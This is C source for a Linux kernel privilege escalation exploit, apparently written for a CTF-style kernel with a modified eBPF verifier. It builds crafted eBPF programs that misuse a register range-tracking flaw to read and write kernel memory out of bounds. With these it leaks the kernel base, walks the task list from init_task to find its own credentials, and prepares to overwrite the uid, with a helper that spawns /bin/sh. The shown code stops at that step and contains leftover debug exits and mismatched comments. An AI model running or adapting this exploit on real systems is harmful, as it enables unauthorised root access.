#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/uio.h>
 
#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))
 
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
// eebpf
#define BPF_ALSH	0xe0	/* sign extending arithmetic shift left */
#define BPF_ALSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_ALSH | BPF_X, DST, SRC, 0, 0)
#define BPF_ALSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_ALSH | BPF_K, DST, 0, 0, IMM)
#define BPF_ALSH64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_ALSH | BPF_X, DST, SRC, 0, 0)
#define BPF_ALSH64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_ALSH | BPF_K, DST, 0, 0, IMM)
 
 
/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10
 
#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU32_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
 
struct my_bpf_map_info {
	__u32 type;
	__u32 id;
	__u32 key_size;
	__u32 value_size;
	__u32 max_entries;
	__u32 map_flags;
	char  name[BPF_OBJ_NAME_LEN];
	__u32 ifindex;
	__u32 :32;
	__u64 netns_dev;
	__u64 netns_ino;
	__u32 btf_id;
	__u32 btf_key_type_id;
	__u32 btf_value_type_id;
} __attribute__((aligned(8)));


int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}
 
int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}
int bpf_create_map(enum bpf_map_type map_type, uint32_t key_size, uint32_t value_size, uint32_t max_entries) {
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };
    return syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}
 
int array_update(int mapfd, uint32_t key, uint64_t value)
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (uint64_t)&key,
		.value = (uint64_t)&value,
		.flags = BPF_ANY,
	};
	return bpf_(BPF_MAP_UPDATE_ELEM, &attr);
}
 
int array_update_big(int mapfd, uint32_t key, char* value)
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (uint64_t)&key,
		.value = value,
		.flags = BPF_ANY,
	};
	return bpf_(BPF_MAP_UPDATE_ELEM, &attr);
}
 
unsigned long get_ulong(int map_fd, uint64_t idx) {
  uint64_t value;
  union bpf_attr lookup_map_attrs = {
    .map_fd = map_fd,
    .key = (uint64_t)&idx,
    .value = (uint64_t)&value
  };
  if (bpf_(BPF_MAP_LOOKUP_ELEM, &lookup_map_attrs))
    err(1, "MAP_LOOKUP_ELEM");
  return value;
}
 
int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  //printf("==========================\n%s==========================\n",verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}
 
int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);
 
  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}
#define LOG_BUF_SIZE 65535
int bpf_prog_load(const struct bpf_insn *insns, size_t insn_cnt, const char *license, char *log_buf, size_t log_buf_sz) {
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (uint64_t)(insns),
        .insn_cnt = insn_cnt,
        .license = (uint64_t)license,
        .log_buf = (uint64_t)log_buf,
        .log_size = LOG_BUF_SIZE,
        .log_level = 3
    };
    return syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

char bpf_log_buf[LOG_BUF_SIZE];
int open_bpf_socket(const struct bpf_insn *insns, size_t insn_cnt) {
    int prog_fd = bpf_prog_load(insns, insn_cnt, "GPL", bpf_log_buf, LOG_BUF_SIZE);

    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
        printf("failed to create socket\n");
        exit(1);
    }

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(int))) {
        perror("setsockopt");
        exit(1);
    }

    return sockets[1];
}
 
void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}
 
 
/*** globals ***/
int control_map = -1;
int reader_map = -1;
int writer_map = -1;
int reader = -1;
int aar_trigger = -1;
unsigned long bpf_reg_fp = 0;
unsigned long kernbase;
const unsigned long diff_id_btf = 88;
const unsigned long diff_btf_val = 0x90;

int bpf_map_update_elem(int fd, uint64_t key, uint64_t value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)&key,
        .value = (uint64_t)&value,
        .flags = flags,
    };
    return syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}
 
unsigned long read_rel(void)
{
	unsigned long tmp = 0;
  if(reader == -1){
    printf("[ERROR] readers are not instantiated.\n");
    return 0;
  }
 
  bpf_map_update_elem(control_map, 0, 0, BPF_ANY);
  bpf_map_update_elem(control_map, 1, 1, BPF_ANY);
  // array_update(control_map, 0, 0);
  // array_update(control_map, 1, 1);
  // trigger_proc(reader);
    if (write(reader, "A", 1) != 1) { // trigger bpf program
        perror("write");
        exit(1);
    }
 
    uint64_t addr_ops = 0;
    if (bpf_map_lookup_elem(control_map, 2, (void *)&addr_ops) < 0) {
        perror("bpf_map_lookup_elem");
        exit(1);
    }
  tmp = get_ulong(control_map, 0);
  //printf("[+] %llx\n", tmp);
  return tmp;
}
 
unsigned long aar32(unsigned long _target)
{
	_target -= diff_id_btf;
 
	// overwrite target bpf_map.btf
  array_update(control_map, 0, 0);
  array_update(control_map, 1, 1);
	array_update(control_map, 2, _target);
	trigger_proc(aar_trigger);
 
	// read it
	struct my_bpf_map_info leaker;
	union bpf_attr myattr = {
		.info.bpf_fd = reader_map,
		.info.info_len = sizeof(leaker),
		.info.info = &leaker,
	};
	bpf_(BPF_OBJ_GET_INFO_BY_FD, &myattr);
	return leaker.btf_id;
}
 
unsigned long aar64(unsigned long _target){
	unsigned long lower = aar32(_target);
	unsigned long higher = aar32(_target + 4) << 32;
	return higher + lower;
}
 
int aaw_done = -1;
 
unsigned long aaw32zero(unsigned long _target, unsigned int val, unsigned long writer_map_addr)
{
	if(aaw_done != -1){
		printf("[ERROR] aaw32 can be called only once.");
		exit(0);
	}
	aaw_done = 1;
	/*****
	 * ffffffff81e168c0 D array_map_ops
	 * ffffffff81148850 t array_map_get_next_key
	 *
	 * array_map_ops = {
  map_alloc_check = 0xffffffff81148780 ,
  map_alloc = 0xffffffff811491a0 ,
  map_release = 0x0 ,
  map_free = 0xffffffff81148ee0 ,
  map_get_next_key = 0xffffffff81148850 ,
  map_release_uref = 0x0 ,
  map_lookup_elem_sys_only = 0x0 ,
  map_lookup_elem = 0xffffffff811489d0 ,
  map_update_elem = 0xffffffff81148dd0 ,
  map_delete_elem = 0xffffffff81148880 ,
  map_push_elem = 0x0 ,
  map_pop_elem = 0x0 ,
  map_peek_elem = 0x0 ,
  map_fd_get_ptr = 0x0 ,
  map_fd_put_ptr = 0x0 ,
  map_gen_lookup = 0xffffffff81148c60 ,
  map_fd_sys_lookup_elem = 0x0 ,
  map_seq_show_elem = 0xffffffff81148ad0 ,
  map_check_btf = 0xffffffff81148a50 ,
  map_direct_value_addr = 0xffffffff811487e0 ,
  map_direct_value_meta = 0xffffffff81148810 
}
	then, offset of map_push_elem is 0x50.
	*****/
	const unsigned long  target = _target;
  const struct bpf_insn aaw_insns[] = {
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),    // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),      // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),      // r6 = cmap[0] (==0)
    /* get cmap[1] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),    // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),      // qword[r2] = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),      // r7 = cmap[1] (==1)
    /* get cmap[3] == writer map addr */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),    // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 3),      // qword[r2] = 2
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 2)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),      // r9 = cmap[3] (==target addr)
    /* exploit r1 range */
    BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1),					// r6 &= 1
    BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63),				// r6 s<< 63
    BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63),				// r6 s>> 63
		BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),					// r7 &= 1
		BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7),	// r6 += r7
		/* now, r6 is regarded as (0,0), but actually (0, -1) */
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),			// r6 *= 0x150 (still regarded as 0)
    /* get &writermap */
    BPF_LD_MAP_FD(BPF_REG_1, writer_map),    	// r1 = wmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),      // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(rmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),      // r8 = wmap[0]
		/* make point R8 to target */
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),				// r8 == &wmap[0] now
		BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xD0),						// r8 == &wmap.map_ops
		/* overwrite map_ops */
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
		/* overwrite spin_lock_off to 0 */
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 44),						// r8 == &wmap.map.spin_lock_off
		BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 0),
		/* overwrite map_type to BPF_MAP_TYPE_STACK */
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, -44 + 24),			// r8 == &wmap.map.map_type
		BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 23),
		/* oeverwrite map.max_entries to 0 */
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 12),			// r8 == &wmap.map.max_entries
		BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 0),
    /* Go home */
    BPF_MOV64_IMM(BPF_REG_0, 0),                    // r0 = 0
    BPF_EXIT_INSN()
  };
  int aaw_trigger = create_filtered_socket_fd(aaw_insns, ARRSIZE(aaw_insns));
	// overwrite target bpf_map.btf
  array_update(control_map, 0, 0);
  array_update(control_map, 1, 1);
	array_update(control_map, 2, target);
	array_update(control_map, 3, writer_map_addr);
	trigger_proc(aaw_trigger);
	// overwrite
	const unsigned long key = 10;
	const unsigned long value = 0;	// not used
	union bpf_attr nirugiri = {
		.map_fd = writer_map,
		.key = &key,
		.value = &value,
		.flags = target,
	};
	return bpf_(BPF_MAP_UPDATE_ELEM, &nirugiri);
}
void copy_map_ops(int mapfd, unsigned long addr_map_ops)
{
	printf("[+] copying/overwriting map_ops...\n");
	char *copied_map = calloc(0x700, 1);
	unsigned long *maps = copied_map;
	// copy map_ops
	for(int ix=0; ix!=21; ++ix){
		unsigned long val = aar64(addr_map_ops + 8*ix);
		maps[ix] = val;
	}
	// overwrite map_push_elem with map_get_next_key
	maps[10] = maps[4];
	// load
	array_update_big(mapfd, 0, copied_map);
}
int main(int argc, char *argv[])
{
  // control_map = array_create(0x8, 10);	// [0]: always 0 [1]: always 1 [2]: target addr
    control_map = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 10);
	// reader_map = array_create(0x700, 1);	// for read
    reader_map = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 0x700, 1);
	writer_map = array_create(0x700, 1);	// for write
  struct bpf_insn reader_insns[] = {
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),    // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),      // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),      // r6 = cmap[0] (==0)
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),               // r9 = &cmap[0]
    /* get cmap[1] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),      // qword[r2] = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),      // r7 = cmap[1] (==1)
    /* exploit r1 range */
    BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 3),					// r6 &= 1
    BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63),				// r6 s<< 63
    BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63),				// r6 s>> 63
		BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),					// r7 &= 1
		BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7),	// r6 += r7
		/* now, r6 is regarded as (0,0), but actually (0, -1) */
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),			// r6 *= 0x150 (still regarded as 0)
    /* get readermap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, reader_map),    	// r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),      // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(rmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),      // r8 = &rmap[0]
		/* */
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),	// r8 == &rmap[0] now
		BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xD0),			// leak array_map_ops
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_3, 0),	// cmap[0] = array_map_ops
    /* Go home */
    BPF_MOV64_IMM(BPF_REG_0, 0),                    // r0 = 0
    BPF_EXIT_INSN()
  };
  // reader = create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));
  reader = open_bpf_socket(reader_insns, sizeof(reader_insns) / sizeof(reader_insns[0]));
  // leak kernbase
  const unsigned long _map_array = read_rel();
	printf("[+] map_array: %llx\n", _map_array);
    exit(1);
	/***** System.map
	 * ffffffff81000000 T _text
	 * ffffffff81e168c0 D array_map_ops
	 * ffffffff82211780 D init_task
	 * diff array_map_ops, _text = 0xe168c0
	 * diff init_task, _text = 0x1211780
	 *****/
	kernbase = _map_array - 0xE168C0;
	const unsigned long _init_task =   kernbase + 0x1211780;
	const unsigned long addr_map_ops = kernbase + 0x0E168C0;
	printf("[+] kernbase: %llx\n", kernbase);
	printf("[+] init_task: %llx\n", _init_task);
	// prepare AAR
  const struct bpf_insn aar_insns[] = {
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),    // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),      // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),      // r6 = cmap[0] (==0)
    /* get cmap[1] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),    // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),      // qword[r2] = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),      // r7 = cmap[1] (==1)
    /* get cmap[2] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),    // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 2),      // qword[r2] = 2
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(cmap, 2)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),      // r9 = cmap[2] (==target addr)
    /* exploit r1 range */
    BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1),					// r6 &= 1
    BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63),				// r6 s<< 63
    BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63),				// r6 s>> 63
		BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),					// r7 &= 1
		BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7),	// r6 += r7
		/* now, r6 is regarded as (0,0), but actually (0, -1) */
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),			// r6 *= 0x150 (still regarded as 0)
    /* get readermap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, reader_map),    	// r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),     // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),  // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),      // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),  // r0 = map_lookup_elem(rmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),      // r8 = &rmap[0]
		/* make point R8 to target */
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),				// r8 == &rmap[0] now
		BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, diff_btf_val),			// r8 == &map.btf
		/* overwrite bpf_map.btf */
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
    /* Go home */
    BPF_MOV64_IMM(BPF_REG_0, 0),                    // r0 = 0
    BPF_EXIT_INSN()
  };
  aar_trigger = create_filtered_socket_fd(aar_insns, ARRSIZE(aar_insns));
	// task traversal
  /****
  /  912      |    16 /    struct list_head {
  /  912      |     8 /        struct list_head *next;
  /  920      |     8 /        struct list_head *prev;
                            } tasks;
  / 1168      |     4 /    pid_t pid;
  / 1584      |     8 /    const struct cred *cred;
   ****/
  unsigned long cur_task = _init_task;
  pid_t cur_pid;
  pid_t mypid = getpid();
  for(int ix=0; ix!=0x10; ++ix){
    printf("[.] searching %llx for pid %d...  ", cur_task, mypid);
    cur_pid = aar32(cur_task + 1168);
    if(cur_pid == mypid){
      printf("\n[!] pid found\n");
			printf("[!] my task @ %llx\n", cur_task);
      break;
    }else{
      printf("  not found (pid is %d)\n", cur_pid);
    }
    cur_task = aar64(cur_task + 920) - 912;
  }
	const unsigned long long mycred = aar64(cur_task + 1584);
	printf("[!] my cred @ %llx\n", mycred);
	// leak writer_map's addr
	const unsigned long files = aar64(cur_task + 1656);
	const unsigned long writer_map_file = aar64(files + 160 + writer_map * 8);
	const unsigned long writer_map_addr = aar64(writer_map_file + 200) + 0xD0;
	printf("[!] writer_map @ %llx\n", writer_map_addr);
	// overwrite my task.cred.uid with 0
